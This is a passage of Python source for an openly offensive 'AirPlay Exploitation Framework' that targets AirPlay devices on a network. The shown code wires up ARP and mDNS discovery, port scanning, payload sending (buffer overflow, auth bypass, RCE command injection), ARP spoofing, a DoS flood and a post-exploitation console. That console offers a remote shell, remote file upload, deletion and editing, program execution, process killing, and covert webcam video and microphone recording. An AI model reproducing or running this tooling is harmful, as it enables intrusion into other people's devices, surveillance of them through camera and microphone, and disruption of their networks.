        return FileManager.ls(ip, port, directory)

    def cd_cmd(ip, port):
        directory = Prompt.ask("[bold cyan]Enter directory to change to[/bold cyan]")
        return FileManager.cd(ip, port, directory)

    def download_cmd(ip, port):
        remote_path = Prompt.ask("[bold cyan]Enter remote file path to download[/bold cyan]")
        return FileManager.download(ip, port, remote_path)

    def upload_cmd(ip, port):
        local_path = Prompt.ask("[bold cyan]Enter local file path to upload[/bold cyan]")
        return FileManager.upload(ip, port, local_path)

    def rm_cmd(ip, port):
        file_path = Prompt.ask("[bold cyan]Enter file path to delete[/bold cyan]")
        return FileManager.rm(ip, port, file_path)

    def edit_cmd(ip, port):
        file_path = Prompt.ask("[bold cyan]Enter file path to edit[/bold cyan]")
        return FileManager.edit(ip, port, file_path)

    def mkdir_cmd(ip, port):
        dir_name = Prompt.ask("[bold cyan]Enter directory name to create[/bold cyan]")
        return FileManager.mkdir(ip, port, dir_name)

    def execute_cmd(ip, port):
        program = Prompt.ask("[bold cyan]Enter program to execute[/bold cyan]")
        return DeviceControl.execute(ip, port, program)

    def kill_cmd(ip, port):
        pid = IntPrompt.ask("[bold cyan]Enter PID to kill[/bold cyan]")
        return DeviceControl.kill(ip, port, pid)

    def webcam_snap_cmd(ip, port):
        camera_type = Prompt.ask("[bold cyan]Enter camera type (front/back)[/bold cyan]", choices=["front", "back"], default="front")
        return CameraMic.webcam_snap(ip, port, camera_type)

    def webcam_stream_cmd(ip, port):
        duration = IntPrompt.ask("[bold cyan]Enter stream duration (seconds)[/bold cyan]", default=30)
        return CameraMic.webcam_stream(ip, port, duration)

    def record_mic_cmd(ip, port):
        duration = IntPrompt.ask("[bold cyan]Enter recording duration (seconds)[/bold cyan]", default=10)
        return CameraMic.record_mic(ip, port, duration)

    def portfwd_cmd(ip, port):
        local_port = IntPrompt.ask("[bold cyan]Enter local port[/bold cyan]")
        remote_port = IntPrompt.ask("[bold cyan]Enter remote port[/bold cyan]")
        remote_ip = Prompt.ask("[bold cyan]Enter remote IP[/bold cyan]")
        return NetworkCommands.portfwd_add(ip, port, local_port, remote_port, remote_ip)

    def sessions_cmd(ip, port):
        session_id = IntPrompt.ask("[bold cyan]Enter session ID[/bold cyan]")
        return AdvancedCommands.sessions(ip, port, session_id)

    def shell_cmd(ip, port):
        """Enter a native system shell."""
        console.print("[bold green][Shell] Entering native system shell. Type 'exit' to return.[/bold green]")
        try:
            while True:
                command = Prompt.ask("[bold cyan]shell> [/bold cyan]")
                if command.lower() == 'exit':
                    break
                result = RCEExploit.execute_rce(ip, port, command)
                if result['status'] == 'success':
                    console.print(result['response'])
                else:
                    console.print(f"[bold red][Shell] Command failed: {result.get('error', 'No response')}[/bold red]")
        except KeyboardInterrupt:
            console.print("\n[bold yellow][Shell] Shell session terminated[/bold yellow]")

    def run_cmd(ip, port):
        """Run a Ruby script (simulated)."""
        script_path = Prompt.ask("[bold cyan]Enter Ruby script path[/bold cyan]")
        try:
            with open(script_path, "r") as f:
                script_content = f.read()
            console.print(f"[bold yellow][Script] Simulating Ruby script execution:\n{script_content[:500]}...[/bold yellow]")
            return {'status': 'success', 'info': 'Script executed (simulated)'}
        except Exception as e:
            console.print(f"[bold red][Script] Script execution error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    def execute_custom_command(ip, port):
        command = Prompt.ask("[bold cyan]Enter command to execute[/bold cyan]")
        result = RCEExploit.execute_rce(ip, port, command)
        if result['status'] == 'success':
            console.print(Panel(result['response'], title="Command Output"))
        else:
            console.print(f"[bold red][Stealth] Command execution failed: {result.get('error', 'No response')}[/bold red]")

    def record_front_video_cmd(ip, port):
        duration = IntPrompt.ask("[bold cyan]Enter video duration (seconds)[/bold cyan]", default=10)
        return RCEExploit.record_front_video(ip, port, duration)

    def record_back_video_cmd(ip, port):
        duration = IntPrompt.ask("[bold cyan]Enter video duration (seconds)[/bold cyan]", default=10)
        return RCEExploit.record_back_video(ip, port, duration)

    def upload_program_cmd(ip, port):
        local_path = Prompt.ask("[bold cyan]Enter local file path to upload[/bold cyan]")
        return RCEExploit.upload_program(ip, port, local_path)

    def delete_file_cmd(ip, port):
        file_path = Prompt.ask("[bold cyan]Enter file path to delete[/bold cyan]")
        return RCEExploit.delete_file(ip, port, file_path)

    try:
        while True:
            cmd = Prompt.ask("[bold cyan]Shell>[/bold cyan] ").strip()
            
            if cmd.lower() == 'exit':
                console.print("[bold yellow]Session terminated[/bold yellow]")
                break
                
            if cmd.startswith('!'):
                local_cmd = cmd[1:]
                console.print(f"[bold yellow]Executing local: {local_cmd}[/bold yellow]")
                os.system(local_cmd)
                continue
                
            if cmd in commands:
                result = commands[cmd]["function"]()
                if result == "exit":
                    break
            else:
                console.print(f"[red]Unknown command: {cmd}. Type 'help' for available commands.[/red]")
                
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Session terminated by user[/bold yellow]")

def save_results(devices, filename="scan_results", format="json"):
    try:
        if format == "json":
            with open(f"{filename}.json", "w") as f:
                json.dump(devices, f, indent=4)
        elif format == "csv":
            with open(f"{filename}.csv", "w", newline='') as f:
                writer = csv.DictWriter(f, fieldnames=devices[0].keys())
                writer.writeheader()
                writer.writerows(devices)
        elif format == "txt":
            with open(f"{filename}.txt", "w") as f:
                for device in devices:
                    f.write(f"IP: {device.get('ip', 'N/A')}\n")
                    f.write(f"MAC: {device.get('mac', 'N/A')}\n")
                    f.write(f"Type: {device.get('type', 'Unknown')}\n")
                    if 'fingerprint' in device:
                        f.write("Fingerprint:\n")
                        for k, v in device['fingerprint'].items():
                            f.write(f"  {k}: {v}\n")
                    f.write("\n")
                
        console.print(f"[bold green]Results saved to {filename}.{format}[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Error saving results: {e}[/bold red]")

def show_devices(devices, title="Discovered Devices"):
    if not devices:
        console.print("[bold red]No devices found![/bold red]")
        return
    
    table = Table(title=title, style="bold green")
    table.add_column("IP", style="cyan")
    table.add_column("MAC", style="magenta")
    table.add_column("Vendor", style="yellow")
    table.add_column("Type", style="blue")
    
    if 'name' in devices[0]:
        table.add_column("Name", style="blue")
    if 'port' in devices[0]:
        table.add_column("Port", style="green")
    
    for device in devices:
        row = [
            device['ip'], 
            device.get('mac', 'N/A'), 
            device.get('vendor', 'Unknown'),
            device.get('type', 'Unknown')
        ]
        if 'name' in device:
            row.append(device['name'])
        if 'port' in device:
            row.append(str(device['port']))
        table.add_row(*row)
    
    console.print(table)

def show_fingerprint_results(devices):
    if not devices:
        console.print("[bold red]No devices to display![/bold red]")
        return
    
    for device in devices:
        panel_content = []
        panel_content.append(f"[bold]IP:[/bold] {device.get('ip', 'N/A')}")
        panel_content.append(f"[bold]MAC:[/bold] {device.get('mac', 'N/A')}")
        panel_content.append(f"[bold]Vendor:[/bold] {device.get('vendor', 'Unknown')}")
        panel_content.append(f"[bold]Type:[/bold] {device.get('type', 'Unknown')}")
        
        if 'fingerprint' in device:
            fp = device['fingerprint']
            panel_content.append("\n[bold underline]Fingerprint:[/bold underline]")
            
            if 'device_type' in fp:
                panel_content.append(f"Detected Type: [magenta]{fp['device_type']}[/magenta]")
            
            if 'http_response' in fp:
                panel_content.append("\n[bold]HTTP Response:[/bold]")
                panel_content.append(fp['http_response'][:500] + ("..." if len(fp['http_response']) > 500 else ""))
            
            if 'error' in fp:
                panel_content.append(f"[red]Error: {fp['error']}[/red]")
        
        console.print(Panel("\n".join(panel_content), 
                     title=f"Device {device.get('ip', '')} Details",
                     style="blue"))

def show_vulnerability_report(vulnerabilities):
    if not vulnerabilities:
        console.print("[bold green]No known vulnerabilities detected![/bold green]")
        return
    
    table = Table(title="Vulnerability Report", style="bold red")
    table.add_column("CVE ID", style="cyan")
    table.add_column("Description", style="yellow")
    table.add_column("Affected Ports", style="magenta")
    table.add_column("Device Types", style="green")
    
    for vuln_id, details in vulnerabilities.items():
        table.add_row(
            vuln_id,
            details['description'],
            ", ".join(map(str, details['ports'])),
            ", ".join(details['devices'])
        )
    
    console.print(table)

def check_known_vulnerabilities(device):
    results = []
    device_type = device.get('type', '').lower()
    
    for vuln_id, details in KNOWN_VULNERABILITIES.items():
        if 'all' not in details['devices']:
            type_match = False
            for dev_type in details['devices']:
                if dev_type.lower() in device_type:
                    type_match = True
                    break
            if not type_match:
                continue
        
        if 'port' in device:
            if device['port'] in details['ports']:
                results.append(vuln_id)
        else:
            results.append(vuln_id)
    
    return results

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="AirPlay Exploitation Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Examples:\n"
               "  python airborne_exploit.py -t 192.168.1.100 -p 7000 --exploit Kernel_RCE\n"
               "  python airborne_exploit.py --scan --interface eth0\n"
               "  python airborne_exploit.py -t 192.168.1.100 --interactive"
    )
    
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="Target port number")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface to use")
    parser.add_argument("--scan", action="store_true", help="Perform network scan")
    parser.add_argument("--exploit", help="CVE to exploit (e.g. Kernel_RCE, CVE-2020-3831, or Custom_Exploit)")
    parser.add_argument("--interactive", action="store_true", help="Start interactive session")
    parser.add_argument("--dos", action="store_true", help="Launch DoS attack")
    parser.add_argument("--payload", help="Custom payload file to execute")
    
    return parser.parse_args()

def main_menu():
    print_logo()
    console.print(Panel("[bold blue]AirPlay Exploitation Framework[/bold blue]\n[italic]Use responsibly and only on authorized networks![/italic]"))
    
    devices = []
    scan_results = []
    
    while True:
        console.print(Panel("[bold]Main Menu:[/bold]\n"
                          "1. Network Discovery\n"
                          "2. Port Scanning\n"
                          "3. Payload Testing\n"
                          "4. ARP Spoofing\n"
                          "5. Save Results\n"
                          "6. Vulnerability Analysis\n"
                          "7. Device Fingerprinting\n"
                          "8. Known Vulnerabilities\n"
                          "9. Exit", title="Options"))
        
        choice = Prompt.ask("[bold cyan]Select an option (1-9)[/bold cyan]", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        
        if choice == "1":
            console.print(Panel("[bold]Discovery Methods:[/bold]\n"
                              "1. ARP Scan\n"
                              "2. mDNS Scan (AirPlay)\n"
                              "3. Both Methods", title="Scan Options"))
            
            scan_choice = Prompt.ask("[bold cyan]Select scan type (1-3)[/bold cyan]", choices=["1", "2", "3"])
            
            if scan_choice == "1":
                interface = Prompt.ask("[bold cyan]Enter network interface[/bold cyan]", default="eth0")
                devices = advanced_arp_scan(interface=interface)
                show_devices(devices, "ARP Scan Results")
                scan_results.extend(devices)
                
            elif scan_choice == "2":
                devices = enhanced_mdns_scan()
                show_devices(devices, "mDNS Scan Results")
                scan_results.extend(devices)
                
            elif scan_choice == "3":
                interface = Prompt.ask("[bold cyan]Enter network interface[/bold cyan]", default="eth0")
                arp_devices = advanced_arp_scan(interface=interface)
                mdns_devices = enhanced_mdns_scan()
                
                all_devices = arp_devices + mdns_devices
                show_devices(all_devices, "Combined Scan Results")
                scan_results.extend(all_devices)
                
        elif choice == "2":
            if not devices:
                console.print("[bold yellow]No devices found. Please scan first.[/bold yellow]")
                continue
                
            target_ip = Prompt.ask("[bold cyan]Enter target IP[/bold cyan]")
            custom_ports = Confirm.ask("[bold cyan]Use custom ports?[/bold cyan]", default=False)
            
            if custom_ports:
                ports = Prompt.ask("[bold cyan]Enter ports (comma separated)[/bold cyan]")
                ports = [int(p.strip()) for p in ports.split(",")]
            else:
                ports = [7000, 5353, 62078, 3689, 5000]
                
            open_ports = port_scan(target_ip, ports)
            
            if open_ports:
                console.print(f"[bold green]Open ports on {target_ip}:[/bold green] {', '.join(map(str, open_ports))}")
                
                vulnerable_ports = []
                for port in open_ports:
                    for vuln_id, details in KNOWN_VULNERABILITIES.items():
                        if port in details['ports']:
                            vulnerable_ports.append((port, vuln_id))
                
                if vulnerable_ports:
                    console.print("[bold red]Potential Vulnerable Ports:[/bold red]")
                    for port, vuln_id in vulnerable_ports:
                        console.print(f"Port {port}: {vuln_id} - {KNOWN_VULNERABILITIES[vuln_id]['description']}")
            else:
                console.print(f"[bold red]No open ports found on {target_ip}[/bold red]")
                
        elif choice == "3":
            if not devices:
                console.print("[bold yellow]No devices found. Please scan first.[/bold yellow]")
                continue
                
            target_ip = Prompt.ask("[bold cyan]Enter target IP[/bold cyan]")
            port = IntPrompt.ask("[bold cyan]Enter target port[/bold cyan]", default=7000)
            
            payload_options = PayloadGenerator.get_available_payloads() + ["rce_command_injection"]
            payload_menu = "\n".join([f"{i+1}. {p} - {PayloadGenerator.get_payload_description(p) if p != 'rce_command_injection' else 'Kernel RCE command injection'}" 
                                     for i, p in enumerate(payload_options)])
            
            console.print(Panel(f"[bold]Payload Types:[/bold]\n{payload_menu}", title="Payload Options"))
            
            payload_choice = IntPrompt.ask("[bold cyan]Select payload type (1-{})[/bold cyan]".format(len(payload_options)),
                                         choices=[str(i+1) for i in range(len(payload_options))])
            
            size = IntPrompt.ask("[bold cyan]Enter payload size (bytes)[/bold cyan]", default=1024)
            count = IntPrompt.ask("[bold cyan]Enter number of packets[/bold cyan]", default=1)
            
            selected_payload = payload_options[payload_choice - 1]
            
            results = send_and_analyze(target_ip, port, selected_payload, size, count)
            
            if results:
                table = Table(title="Payload Analysis Results", style="bold yellow")
                table.add_column("Payload", style="cyan")
                table.add_column("Status", style="magenta")
                table.add_column("Details", style="green")
                
                for result in results:
                    if 'vulnerability' in result:
                        table.add_row(result['payload'], 
                                     f"[red]Vulnerable[/red]", 
                                     f"{result['vulnerability']} detected")
                        if result['vulnerability'] == 'rce_command_injection':
                            console.print("[bold green]RCE exploit successful! Starting interactive shell...[/bold green]")
                            RCEExploit.interactive_rce_shell(target_ip, port)
                    else:
                        table.add_row(result['payload'], 
                                     "[green]Secure[/green]", 
                                     result.get('status', 'no issues detected'))
                
                console.print(table)
            else:
                console.print("[bold red]No results received from target[/bold red]")
            
        elif choice == "4":
            if not devices:
                console.print("[bold yellow]No devices found. Please scan first.[/bold yellow]")
                continue
                
            target_ip = Prompt.ask("[bold cyan]Enter target IP[/bold cyan]")
            gateway_ip = Prompt.ask("[bold cyan]Enter gateway IP[/bold cyan]")
            interface = Prompt.ask("[bold cyan]Enter network interface[/bold cyan]", default="eth0")
            duration = IntPrompt.ask("[bold cyan]Enter attack duration (seconds)[/bold cyan]", default=10)
            
            if Confirm.ask("[bold red]WARNING: ARP spoofing will disrupt network traffic. Continue?[/bold red]", default=False):
                arp_spoof(target_ip, gateway_ip, interface, duration)
            else:
                console.print("[bold yellow]ARP spoofing cancelled[/bold yellow]")
            
        elif choice == "5":
            if not scan_results:
                console.print("[bold yellow]No results to save![/bold yellow]")
                continue
                
            filename = Prompt.ask("[bold cyan]Enter filename (without extension)[/bold cyan]", default="scan_results")
            format = Prompt.ask("[bold cyan]Select format (json/csv/txt)[/bold cyan]", choices=["json", "csv", "txt"], default="json")
            
            save_results(scan_results, filename, format)
            
        elif choice == "6":
            if not devices:
                console.print("[bold yellow]No devices found. Please scan first.[/bold yellow]")
                continue
                
            target_ip = Prompt.ask("[bold cyan]Enter target IP[/bold cyan]")
            port = IntPrompt.ask("[bold cyan]Enter target port[/bold cyan]", default=7000)
            
            console.print(Panel("[bold]Vulnerability Tests:[/bold]\n"
                              "1. Information Leak Test\n"
                              "2. Buffer Overflow Test\n"
                              "3. Authentication Bypass\n"
                              "4. Denial of Service\n"
                              "5. Custom Exploit Test\n"
                              "6. Kernel RCE Test\n"
                              "7. Full Vulnerability Scan", title="Test Options"))
            
            test_choice = Prompt.ask("[bold cyan]Select test type (1-7)[/bold cyan]", choices=["1", "2", "3", "4", "5", "6", "7"])
            
            if test_choice == "7":
                results = []
                with Progress() as progress:
                    task = progress.add_task("[red]Scanning for vulnerabilities...", total=len(KNOWN_VULNERABILITIES))
                    
                    for vuln_id, vuln_info in KNOWN_VULNERABILITIES.items():
                        for port in vuln_info['ports']:
                            result = ResponseAnalyzer.check_vulnerability(target_ip, port, vuln_id)
                            if result['status'] == 'vulnerable':
                                results.append(result)
                                if vuln_id == "Kernel_RCE":
                                    console.print("[bold green]RCE exploit successful! Starting interactive shell...[/bold green]")
                                    RCEExploit.interactive_rce_shell(target_ip, port)
                        progress.update(task, advance=1)
                
                if results:
                    table = Table(title="Vulnerability Scan Results", style="bold red")
                    table.add_column("Vulnerability", style="cyan")
                    table.add_column("Port", style="magenta")
                    table.add_column("Status", style="red")
                    table.add_column("Details", style="yellow")
                    
                    for result in results:
                        table.add_row(
                            result['vulnerability'],
                            str(port),
                            "[red]VULNERABLE[/red]",
                            "\n".join([f"{d['vulnerability']}: {d['indicator']}" for d in result['details']])
                        )
                    
                    console.print(table)
                else:
                    console.print("[bold green]No known vulnerabilities detected![/bold green]")
            else:
                payload_types = ["info_leak", "buffer_overflow", "auth_bypass", "dos", "custom_exploit", "rce_command_injection"]
                results = send_and_analyze(target_ip, port, payload_types[int(test_choice)-1])
                
                if results:
                    table = Table(title="Vulnerability Analysis Results", style="bold yellow")
                    table.add_column("Payload", style="cyan")
                    table.add_column("Status", style="magenta")
                    table.add_column("Details", style="green")
                    
                    for result in results:
                        if 'vulnerability' in result:
                            table.add_row(result['payload'], 
                                         f"[red]Vulnerable[/red]", 
                                         f"{result['vulnerability']} detected")
                            if result['vulnerability'] == 'rce_command_injection':
                                console.print("[bold green]RCE exploit successful! Starting interactive shell...[/bold green]")
                                RCEExploit.interactive_rce_shell(target_ip, port)
                        else:
                            table.add_row(result['payload'], 
                                         "[green]Secure[/green]", 
                                         result.get('status', 'no issues detected'))
                    
                    console.print(table)
                else:
                    console.print("[bold red]No results received from target[/bold red]")
                
        elif choice == "7":
            if not devices:
                console.print("[bold yellow]No devices found. Please scan first.[/bold yellow]")
                continue
                
            console.print("[bold yellow]Starting advanced device fingerprinting...[/bold yellow]")
            fingerprinted_devices = []
            
            with Progress() as progress:
                task = progress.add_task("[cyan]Fingerprinting devices...", total=len(devices))
                
                for device in devices:
                    if 'ip' in device:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(2)
                            s.connect((device['ip'], device.get('port', 7000)))
                            s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                            response = s.recv(4096).decode(errors='ignore')
                            s.close()
                            
                            device['fingerprint'] = {
                                'http_response': response,
                                'device_type': detect_device_type(device)
                            }
                            fingerprinted_devices.append(device)
                        except:
                            device['fingerprint'] = {'error': 'no response'}
                            fingerprinted_devices.append(device)
                    
                    progress.update(task, advance=1)
            
            show_fingerprint_results(fingerprinted_devices)
            
        elif choice == "8":
            show_vulnerability_report(KNOWN_VULNERABILITIES)
            
            if devices:
                if Confirm.ask("[bold cyan]Check devices against known vulnerabilities?[/bold cyan]", default=True):
                    vulnerable_devices = []
                    for device in devices:
                        vulns = check_known_vulnerabilities(device)
                        if vulns:
                            device['vulnerabilities'] = vulns
                            vulnerable_devices.append(device)
                    
                    if vulnerable_devices:
                        console.print("[bold red]Potentially Vulnerable Devices:[/bold red]")
                        for device in vulnerable_devices:
                            console.print(f"\n[bold]Device:[/bold] {device.get('ip', 'N/A')}")
                            console.print(f"[bold]Type:[/bold] {device.get('type', 'Unknown')}")
                            console.print("[bold red]Potential Vulnerabilities:[/bold red]")
                            for vuln in device['vulnerabilities']:
                                console.print(f"- {vuln}: {KNOWN_VULNERABILITIES[vuln]['description']}")
                    else:
                        console.print("[bold green]No devices matched known vulnerabilities![/bold green]")
            
        elif choice == "9":
            console.print("[bold green]Exiting framework...[/bold green]")
            break

def main():
    args = parse_arguments()
    
    if len(sys.argv) == 1:
        main_menu()
        return
    
    print_logo()
    
    if args.scan:
        console.print("[bold yellow]Starting network scan...[/bold yellow]")
        devices = advanced_arp_scan(interface=args.interface)
        mdns_devices = enhanced_mdns_scan()
        all_devices = devices + mdns_devices
        show_devices(all_devices, "Scan Results")
        
        if args.target:
            target = next((d for d in all_devices if d['ip'] == args.target), None)
            if target:
                console.print(f"[green]Target found: {target}[/green]")
            else:
                console.print("[red]Target not found in scan results[/red]")
    
    if args.target:
        if not args.port:
            common_ports = [7000, 5353, 62078, 3689, 5000]
            open_ports = port_scan(args.target, common_ports)
            
            if open_ports:
                console.print(f"[green]Open ports: {open_ports}[/green]")
                args.port = open_ports[0]
            else:
                console.print("[red]No open ports found[/red]")
                return
        
        if args.exploit:
            vuln_info = KNOWN_VULNERABILITIES.get(args.exploit)
            if not vuln_info:
                console.print(f"[red]Unknown vulnerability: {args.exploit}[/red]")
                return
            
            console.print(f"[bold red]Attempting {args.exploit} exploit...[/bold red]")
            
            results = send_payload_sequence(args.target, args.port, vuln_info['payload'] if isinstance(vuln_info['payload'], str) else "custom_exploit")
            
            for result in results:
                if 'response_analysis' in result:
                    console.print(Panel(
                        f"Payload: {result['payload']}\n"
                        f"Headers: {result['response_analysis']['headers']}\n"
                        f"Potential leaks: {result['response_analysis']['potential_leaks']}\n"
                        f"Vulnerability indicators: {result['response_analysis']['vulnerable_indicators']}",
                        title="Payload Analysis"
                    ))
            
            result = ResponseAnalyzer.check_vulnerability(args.target, args.port, args.exploit)
            if result['status'] == 'vulnerable':
                console.print("[bold green]Exploit successful! Starting interactive shell...[/bold green]")
                if args.exploit == "Kernel_RCE":
                    RCEExploit.interactive_rce_shell(args.target, args.port)
                else:
                    create_interactive_session(args.target, args.port)
            
            ResponseAnalyzer.execute_post_exploitation(args.target, args.port, args.exploit)
            
        elif args.dos:
            send_custom_payload(args.target, args.port, "dos", 50000, 100)
            
            status = monitor_device_status(args.target)
            console.print(Panel(
                f"Ping response: {'[green]Yes[/green]' if status['ping'] else '[red]No[/red]'}\n"
                f"mDNS response: {'[green]Yes[/green]' if status['mdns'] else '[red]No[/red]'}\n"
                f"Open ports: {[p['port'] for p in status['ports'] if p['open']]}",
                title="Post-DoS Status"
            ))
        
        elif args.interactive:
            create_interactive_session(args.target, args.port)
        
        elif args.payload:
            try:
                with open(args.payload, 'rb') as f:
                    payload = f.read()
                
                console.print(f"[yellow]Sending custom payload from {args.payload}[/yellow]")
                send_custom_payload(args.target, args.port, payload, len(payload), 1)
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")
        
        else:
            console.print("[yellow]No action specified for target[/yellow]")

if __name__ == "__main__":
    main()
    